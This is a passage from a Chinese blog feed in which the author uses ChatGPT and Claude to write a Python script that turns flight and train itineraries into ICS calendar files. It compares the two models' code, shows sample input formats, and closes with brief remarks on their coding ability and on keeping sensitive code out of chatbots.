class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">import</span> logging<br><br>ics = <span class="hljs-string">&quot;BEGIN:VCALENDAR\n&quot;</span><br>ics += <span class="hljs-string">&quot;PRODID:transport\n&quot;</span>   <span class="hljs-comment"># 修改为transport</span><br>ics += <span class="hljs-string">&quot;VERSION:2.0\n&quot;</span><br>ics += <span class="hljs-string">&quot;CALSCALE:GREGORIAN\n&quot;</span><br><br>info = []  <br>event_count = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;demo.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    content = f.read().strip()<br>    transports = content.split(<span class="hljs-string">&quot;\n\n&quot;</span>)  <span class="hljs-comment"># 修改为transports</span><br>    <span class="hljs-keyword">for</span> transport <span class="hljs-keyword">in</span> transports:<br>        info = transport.split(<span class="hljs-string">&quot;\n&quot;</span>)<br>        <br>        <span class="hljs-comment"># 判断是航班还是高铁</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;高铁&#x27;</span> <span class="hljs-keyword">in</span> info[<span class="hljs-number">0</span>] <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;动车&#x27;</span> <span class="hljs-keyword">in</span> info[<span class="hljs-number">0</span>]:  <br>           <span class="hljs-comment"># 高铁信息  </span><br>           name = info[<span class="hljs-number">0</span>]<br>           <span class="hljs-comment"># 起始站</span><br>           start_station = info[<span class="hljs-number">1</span>] <br>           <span class="hljs-comment"># 出发时间  </span><br>           depart_time = info[<span class="hljs-number">2</span>]<br>           depart_time = datetime.datetime.strptime(depart_time, <span class="hljs-string">&#x27;%Y/%m/%d %H:%M&#x27;</span>)<br>           <span class="hljs-comment"># 终点站</span><br>           end_station = info[<span class="hljs-number">3</span>] <br>           <span class="hljs-comment"># 到达时间</span><br>           arrive_time = info[<span class="hljs-number">4</span>]<br>           arrive_time = datetime.datetime.strptime(arrive_time, <span class="hljs-string">&#x27;%Y/%m/%d %H:%M&#x27;</span>)           <br>           <br>        <span class="hljs-keyword">else</span>:<br>           <span class="hljs-comment"># 航班信息(代码省略)  </span><br>           ...<br>           <br>        <span class="hljs-comment"># 生成VEVENT事件</span><br>        <span class="hljs-keyword">try</span>:<br>            ics += <span class="hljs-string">f&quot;BEGIN:VEVENT\n&quot;</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;高铁&#x27;</span> <span class="hljs-keyword">in</span> name <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;动车&#x27;</span> <span class="hljs-keyword">in</span> name:  <span class="hljs-comment"># 判断是高铁还是航班</span><br>                ics += <span class="hljs-string">f&quot;UID:<span class="hljs-subst">&#123;name&#125;</span>@<span class="hljs-subst">&#123;start_station&#125;</span>@<span class="hljs-subst">&#123;end_station&#125;</span>\n&quot;</span>  <span class="hljs-comment"># 修改机场为站点          </span><br>            <span class="hljs-keyword">else</span>:<br>                ics += <span class="hljs-string">f&quot;UID:<span class="hljs-subst">&#123;name&#125;</span>@<span class="hljs-subst">&#123;depart_airport&#125;</span>@<span class="hljs-subst">&#123;arrive_airport&#125;</span>\n&quot;</span>  <br>            ...   <span class="hljs-comment"># 其他代码不变</span><br>           <br>            event_count += <span class="hljs-number">1</span>  <br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:  <br>            ...   <span class="hljs-comment"># 日志记录异常代码不变</span><br><br><span class="hljs-comment"># 后续代码不变 </span><br>...<br></code></pre></td></tr></table></figure><p>但一眼看出它将原有的 <strong>ics +&#x3D; “PRODID:flight\n”</strong> 修改为了 <strong>ics +&#x3D; “PRODID:transport\n”</strong></p><p>明显不符合我的要求，于是重新把我的需求告诉它，现在看上去是理解了我的需求了。</p><p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230423133500216.png" alt="重新说明需求"></p><p>给出代码后还给出了本次代码修改特点，可谓是很贴心了🤣</p><p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230423133600798.png" alt="修改特点"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">import</span> logging<br><br>ics = <span class="hljs-string">&quot;BEGIN:VCALENDAR\n&quot;</span><br>ics += <span class="hljs-string">&quot;PRODID:transport\n&quot;</span>    <br>ics += <span class="hljs-string">&quot;VERSION:2.0\n&quot;</span><br>ics += <span class="hljs-string">&quot;CALSCALE:GREGORIAN\n&quot;</span><br><br>info = []  <br>event_count = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;demo.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    content = f.read().strip()<br>    transports = content.split(<span class="hljs-string">&quot;\n\n&quot;</span>)  <br><br>    <span class="hljs-keyword">for</span> transport <span class="hljs-keyword">in</span> transports:<br>        info = transport.split(<span class="hljs-string">&quot;\n&quot;</span>)<br>        <br>        <span class="hljs-comment"># 先判断是航班还是高铁,然后分别处理</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;高铁&#x27;</span> <span class="hljs-keyword">in</span> info[<span class="hljs-number">0</span>] <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;动车&#x27;</span> <span class="hljs-keyword">in</span> info[<span class="hljs-number">0</span>]:  <br>           <span class="hljs-comment"># 高铁信息  </span><br>           ... <br>        <span class="hljs-keyword">else</span>:<br>           <span class="hljs-comment"># 航班信息 </span><br>           ...  <br><br>        <span class="hljs-comment"># 生成VEVENT事件</span><br>        <span class="hljs-keyword">try</span>:<br>            ics += <span class="hljs-string">f&quot;BEGIN:VEVENT\n&quot;</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;高铁&#x27;</span> <span class="hljs-keyword">in</span> name <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;动车&#x27;</span> <span class="hljs-keyword">in</span> name:  <br>                ics += <span class="hljs-string">f&quot;UID:<span class="hljs-subst">&#123;name&#125;</span>@<span class="hljs-subst">&#123;start_station&#125;</span>@<span class="hljs-subst">&#123;end_station&#125;</span>\n&quot;</span>              <br>            <span class="hljs-keyword">else</span>:<br>                ics += <span class="hljs-string">f&quot;UID:<span class="hljs-subst">&#123;name&#125;</span>@<span class="hljs-subst">&#123;depart_airport&#125;</span>@<span class="hljs-subst">&#123;arrive_airport&#125;</span>\n&quot;</span>  <br>            ...   <span class="hljs-comment"># 其他代码不变</span><br>           <br>            event_count += <span class="hljs-number">1</span>  <br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:  <br>            ...   <span class="hljs-comment"># 日志记录异常代码不变</span><br><br><span class="hljs-comment"># 后续代码不变 </span><br>...<br></code></pre></td></tr></table></figure><p>运行修正后的代码，成功生产ics文件</p><p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230423134407410.png" alt="Claude生产的ics"></p><h2 id="四、-效果对比"><a href="#四、-效果对比" class="headerlink" title="四、 效果对比"></a>四、 效果对比</h2><p>然后给出与chatgpt生成的ics对比</p><ul><li><p>Claude</p><p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230423114845740.png" alt="Claude效果"></p></li></ul><p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230423114918310.png" alt="Chatgpt效果"></p><h3 id="4-1-最终代码"><a href="#4-1-最终代码" class="headerlink" title="4.1 最终代码"></a>4.1 最终代码</h3><p>贴上Chatgpt和Claude生成的代码</p><h4 id="4-1-1-Chatgpt"><a href="#4-1-1-Chatgpt" class="headerlink" title="4.1.1 Chatgpt"></a>4.1.1 Chatgpt</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime, timedelta<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">convert_to_ics</span>(<span class="hljs-params">travel_info</span>):<br>    regex = <span class="hljs-string">r&quot;(\S+)\s+(\S+)\s+出发时间\s+(\S+\s+\S+)\s+(\S+)\s+达到时间\s+(\S+\s+\S+)&quot;</span><br>    train_regex = <span class="hljs-string">r&quot;(\S+)\s+(\S+)\s+出发时间\s+(\S+\s+\S+)\s+(\S+)\s+到达时间\s+(\S+\s+\S+)&quot;</span><br>    <span class="hljs-keyword">match</span> = re.search(regex, travel_info)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">match</span> = re.search(train_regex, travel_info)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Error: failed to match travel information.&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>        travel_type = <span class="hljs-string">&quot;高铁/动车&quot;</span><br>        train_no, dep_station, dep_time, arr_station, arr_time = <span class="hljs-keyword">match</span>.groups()<br>    <span class="hljs-keyword">else</span>:<br>        travel_type = <span class="hljs-string">&quot;航班&quot;</span><br>        airline, dep_airport, dep_time, arr_airport, arr_time = <span class="hljs-keyword">match</span>.groups()<br><br>    <span class="hljs-comment"># 生成ICS字符串</span><br>    start_time = datetime.strptime(dep_time, <span class="hljs-string">&#x27;%Y/%m/%d %H:%M&#x27;</span>)<br>    end_time = datetime.strptime(arr_time, <span class="hljs-string">&#x27;%Y/%m/%d %H:%M&#x27;</span>)<br>    uid = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;travel_type&#125;</span>-<span class="hljs-subst">&#123;start_time.date()&#125;</span>&#x27;</span><br>    <span class="hljs-keyword">if</span> travel_type == <span class="hljs-string">&quot;航班&quot;</span>:<br>        summary = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;airline&#125;</span> <span class="hljs-subst">&#123;uid&#125;</span>&#x27;</span><br>        location = dep_airport<br>        description = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;airline&#125;</span> 将于<span class="hljs-subst">&#123;dep_time&#125;</span>从<span class="hljs-subst">&#123;dep_airport&#125;</span>出发，预计于<span class="hljs-subst">&#123;arr_time&#125;</span>到达<span class="hljs-subst">&#123;arr_airport&#125;</span>。&#x27;</span><br>    <span class="hljs-keyword">elif</span> travel_type == <span class="hljs-string">&quot;高铁/动车&quot;</span>:<br>        summary = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;train_no&#125;</span> <span class="hljs-subst">&#123;uid&#125;</span>&#x27;</span><br>        location = dep_station<br>        description = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;train_no&#125;</span> 将于<span class="hljs-subst">&#123;dep_time&#125;</span>从<span class="hljs-subst">&#123;dep_station&#125;</span>出发，预计于<span class="hljs-subst">&#123;arr_time&#125;</span>到达<span class="hljs-subst">&#123;arr_station&#125;</span>。&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;Unknown travel type.&quot;</span>)<br><br>    ics_str = <span class="hljs-string">f&#x27;BEGIN:VCALENDAR\nVERSION:2.0\nPRODID:-//ChatGPT//Travel Schedule//EN\nBEGIN:VEVENT\nUID:<span class="hljs-subst">&#123;uid&#125;</span>\nDTSTAMP:<span class="hljs-subst">&#123;datetime.utcnow().strftime(<span class="hljs-string">&quot;%Y%m%dT%H%M%SZ&quot;</span>)&#125;</span>\nDTSTART;TZID=Asia/Shanghai:<span class="hljs-subst">&#123;start_time.strftime(<span class="hljs-string">&quot;%Y%m%dT%H%M%S&quot;</span>)&#125;</span>\nDTEND;TZID=Asia/Shanghai:<span class="hljs-subst">&#123;end_time.strftime(<span class="hljs-string">&quot;%Y%m%dT%H%M%S&quot;</span>)&#125;</span>\nSUMMARY:<span class="hljs-subst">&#123;summary&#125;</span>\nLOCATION:<span class="hljs-subst">&#123;location&#125;</span>\nDESCRIPTION:<span class="hljs-subst">&#123;description&#125;</span>\nEND:VEVENT\nEND:VCALENDAR&#x27;</span><br><br>    <span class="hljs-keyword">return</span> ics_str<br><br><br><span class="hljs-comment"># 读取行程信息</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;Flight.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    travel_info = f.read()<br><br><span class="hljs-comment"># 转换为ICS字符串</span><br>ics_str = convert_to_ics(travel_info)<br><br><span class="hljs-comment"># 将ICS字符串写入文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;result.ics&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(ics_str)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;转换完成！请查看对应目录的result.ics文件&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>Flight.txt的格式</p><ul><li>航班信息</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">厦门航空 MF8415<br>杭州萧山机场T3<br>出发时间 <span class="hljs-number">2023</span><span class="hljs-regexp">/05/</span><span class="hljs-number">04</span> <span class="hljs-number">15</span>:<span class="hljs-number">20</span><br>重庆江北机场T3<br>到达时间 <span class="hljs-number">2023</span><span class="hljs-regexp">/05/</span><span class="hljs-number">04</span> <span class="hljs-number">17</span>:<span class="hljs-number">45</span><br></code></pre></td></tr></table></figure><ul><li>高铁信息</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">高铁/动车 G158<br>杭州东站<br>出发时间 <span class="hljs-number">2023</span><span class="hljs-regexp">/05/</span><span class="hljs-number">04</span> <span class="hljs-number">16</span>:<span class="hljs-number">13</span><br>上海虹桥站<br>到达时间 <span class="hljs-number">2023</span><span class="hljs-regexp">/05/</span><span class="hljs-number">04</span> <span class="hljs-number">17</span>:<span class="hljs-number">12</span><br></code></pre></td></tr></table></figure><h4 id="4-1-2-Claude"><a href="#4-1-2-Claude" class="headerlink" title="4.1.2 Claude"></a>4.1.2 Claude</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">import</span> logging<br><br>ics = <span class="hljs-string">&quot;BEGIN:VCALENDAR\n&quot;</span><br>ics += <span class="hljs-string">&quot;PRODID:transport\n&quot;</span><br>ics += <span class="hljs-string">&quot;VERSION:2.0\n&quot;</span><br>ics += <span class="hljs-string">&quot;CALSCALE:GREGORIAN\n&quot;</span><br><br>info = []<br>event_count = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;demo.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    content = f.read().strip()<br>    transports = content.split(<span class="hljs-string">&quot;\n\n&quot;</span>)<br><br>    <span class="hljs-keyword">for</span> transport <span class="hljs-keyword">in</span> transports:<br>        info = transport.split(<span class="hljs-string">&quot;\n&quot;</span>)<br><br>        <span class="hljs-comment"># 先判断是航班还是高铁,然后分别处理</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;高铁&#x27;</span> <span class="hljs-keyword">in</span> info[<span class="hljs-number">0</span>] <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;动车&#x27;</span> <span class="hljs-keyword">in</span> info[<span class="hljs-number">0</span>]:<br>            <span class="hljs-comment"># 高铁信息</span><br>            name = info[<span class="hljs-number">0</span>]<br>            <span class="hljs-comment"># 起始站</span><br>            start_station = info[<span class="hljs-number">1</span>]<br>            <span class="hljs-comment"># 出发时间</span><br>            depart_time = info[<span class="hljs-number">2</span>]<br>            depart_time = datetime.datetime.strptime(depart_time, <span class="hljs-string">&#x27;%Y/%m/%d %H:%M&#x27;</span>)<br>            <span class="hljs-comment"># 终点站</span><br>            end_station = info[<span class="hljs-number">3</span>]<br>            <span class="hljs-comment"># 到达时间</span><br>            arrive_time = info[<span class="hljs-number">4</span>]<br>            arrive_time = datetime.datetime.strptime(arrive_time, <span class="hljs-string">&#x27;%Y/%m/%d %H:%M&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 航班信息</span><br>            flight_info = transport.split(<span class="hljs-string">&quot;\n&quot;</span>)<br>            name = flight_info[<span class="hljs-number">0</span>]<br>            <span class="hljs-comment"># 解析出机场和时间信息</span><br>            airport = flight_info[<span class="hljs-number">1</span>].split(<span class="hljs-string">&#x27; &#x27;</span>)<br>            depart_airport = <span class="hljs-string">&#x27; &#x27;</span>.join(airport[:<span class="hljs-number">2</span>])<br><br>            depart_time = flight_info[<span class="hljs-number">2</span>]<br>            depart_time = datetime.datetime.strptime(depart_time, <span class="hljs-string">&#x27;%Y-%m-%d %H:%M&#x27;</span>)<br><br>            airport = flight_info[<span class="hljs-number">3</span>].split(<span class="hljs-string">&#x27; &#x27;</span>)<br>            arrive_airport = <span class="hljs-string">&#x27; &#x27;</span>.join(airport[:<span class="hljs-number">2</span>])<br><br>            arrive_time = flight_info[<span class="hljs-number">4</span>]<br>            arrive_time = datetime.datetime.strptime(arrive_time, <span class="hljs-string">&#x27;%Y-%m-%d %H:%M&#x27;</span>)<br><br>            <span class="hljs-comment"># 生成VEVENT事件</span><br>        <span class="hljs-keyword">try</span>:<br>            ics += <span class="hljs-string">f&quot;BEGIN:VEVENT\n&quot;</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;高铁&#x27;</span> <span class="hljs-keyword">in</span> name <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;动车&#x27;</span> <span class="hljs-keyword">in</span> name:<br>                ics += <span class="hljs-string">f&quot;UID:<span class="hljs-subst">&#123;name&#125;</span>@<span class="hljs-subst">&#123;start_station&#125;</span>@<span class="hljs-subst">&#123;end_station&#125;</span>\n&quot;</span><br>            <span class="hljs-keyword">else</span>:<br>                ics += <span class="hljs-string">f&quot;UID:<span class="hljs-subst">&#123;name&#125;</span>@<span class="hljs-subst">&#123;depart_airport&#125;</span>@<span class="hljs-subst">&#123;arrive_airport&#125;</span>\n&quot;</span><br>            ics += <span class="hljs-string">f&quot;DTSTART;TZID=Asia/Shanghai:<span class="hljs-subst">&#123;depart_time.strftime(<span class="hljs-string">&#x27;%Y%m%dT%H%M%S&#x27;</span>)&#125;</span>\n&quot;</span><br>            ics += <span class="hljs-string">f&quot;DTEND;TZID=Asia/Shanghai:<span class="hljs-subst">&#123;arrive_time.strftime(<span class="hljs-string">&#x27;%Y%m%dT%H%M%S&#x27;</span>)&#125;</span>\n&quot;</span><br>            ics += <span class="hljs-string">f&quot;SUMMARY:<span class="hljs-subst">&#123;name&#125;</span>\n&quot;</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;高铁&#x27;</span> <span class="hljs-keyword">in</span> name <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;动车&#x27;</span> <span class="hljs-keyword">in</span> name:<br>                ics += <span class="hljs-string">f&quot;LOCATION:<span class="hljs-subst">&#123;start_station&#125;</span> -&gt; <span class="hljs-subst">&#123;end_station&#125;</span>\n&quot;</span><br>            <span class="hljs-keyword">else</span>:<br>                ics += <span class="hljs-string">f&quot;LOCATION:<span class="hljs-subst">&#123;depart_airport&#125;</span> -&gt; <span class="hljs-subst">&#123;arrive_airport&#125;</span>\n&quot;</span><br>            ics += <span class="hljs-string">&quot;END:VEVENT\n&quot;</span><br>            event_count += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;生成VEVENT失败:<span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>            logging.exception(e)<br><br>ics += <span class="hljs-string">&quot;END:VCALENDAR&quot;</span><br><br><span class="hljs-comment"># 如果成功生成了至少一个事件,就写入文件</span><br><span class="hljs-keyword">if</span> event_count &gt; <span class="hljs-number">0</span>:<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;result.ics&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(ics)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;没有生成任何事件,无法写入到文件&quot;</span>)<br></code></pre></td></tr></table></figure><p>Demo.txt 格式</p><ul><li>航班信息</li></ul><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">厦门航空 MF8415<br>杭州萧山机场T3<br>2023-05-04 15:20<br>重庆江北机场T3<br>2023-05-04 17:45<br></code></pre></td></tr></table></figure><ul><li>高铁信息</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">高铁 G158<br>杭州东站<br><span class="hljs-number">2023</span><span class="hljs-regexp">/05/</span><span class="hljs-number">04</span> <span class="hljs-number">16</span>:<span class="hljs-number">13</span><br>上海虹桥站<br><span class="hljs-number">2023</span><span class="hljs-regexp">/05/</span><span class="hljs-number">04</span> <span class="hljs-number">17</span>:<span class="hljs-number">12</span><br></code></pre></td></tr></table></figure><h2 id="五-、-最后"><a href="#五-、-最后" class="headerlink" title="五 、 最后"></a>五 、 最后</h2><p>整个过程中因为我不想自己去手动调整代码，直接以命令口吻要求Chatgpt和Claude帮我写，如果报错或者输出结果不对，就把结果和错误发送回去，让它继续优化，直到达到自己想要的目的。 因为本人用的gpt3.5 和 Claude，编码能力不及gpt4.0；所以替我写好的代码需要重复调整，在这个上面花费的时间有点多（当然也有我自己写错配置的原因，比如<strong>到达</strong>写成<strong>达到</strong>，chatgpt第二次给我指正这个问题时候我才发现🤣）</p><p>目前代码需要自己在txt文件中添加航班或者高铁信息，还有优化的空间。</p><h3 id="5-1-一些小问题"><a href="#5-1-一些小问题" class="headerlink" title="5.1 一些小问题"></a>5.1 一些小问题</h3><p>在使用Keepchatgpt插件的时候，chatgpt发过来的代码还是会出现中断的情况，但是不会出现报错提示了。此时就需要提升chatgpt 代码没发完整，需要重新发。</p><p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230423004643663.png" alt="chatgpt回复出现中断"></p><h3 id="5-2-代码能力："><a href="#5-2-代码能力：" class="headerlink" title="5.2 代码能力："></a>5.2 <strong>代码能力</strong>：</h3><p>gpt 4.0 &gt;&gt; gpt 3.5 &gt; Claude</p><h3 id="5-3-注意-⚠️"><a href="#5-3-注意-⚠️" class="headerlink" title="5.3 注意 ⚠️"></a>5.3 注意 ⚠️</h3><p>本次只是一个小脚本，信息就是个人的出行信息。不涉及敏感信息，但还是要强调一点：不要在chatgpt上发送有关企业内部代码和敏感涉密代码。信息安全是重中之重！！！</p><p>想吐槽携程啥时候能把这个行程信息同步功能重新上线….😶‍🌫️</p><h2 id="六、参考来源"><a href="#六、参考来源" class="headerlink" title="六、参考来源"></a>六、参考来源</h2><ol><li><a href="https://chat.openai.com/">https://chat.openai.com/</a></li><li><a href="https://app.slack.com/">https://app.slack.com</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>杂谈</category>
      
    </categories>
    
    
    <tags>
      
      <tag>chatgpt LLM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Go语言基础学习(一)</title>
    <link href="/2023/04/21/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0(%E4%B8%80)/"/>
    <url>/2023/04/21/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0(%E4%B8%80)/</url>
    
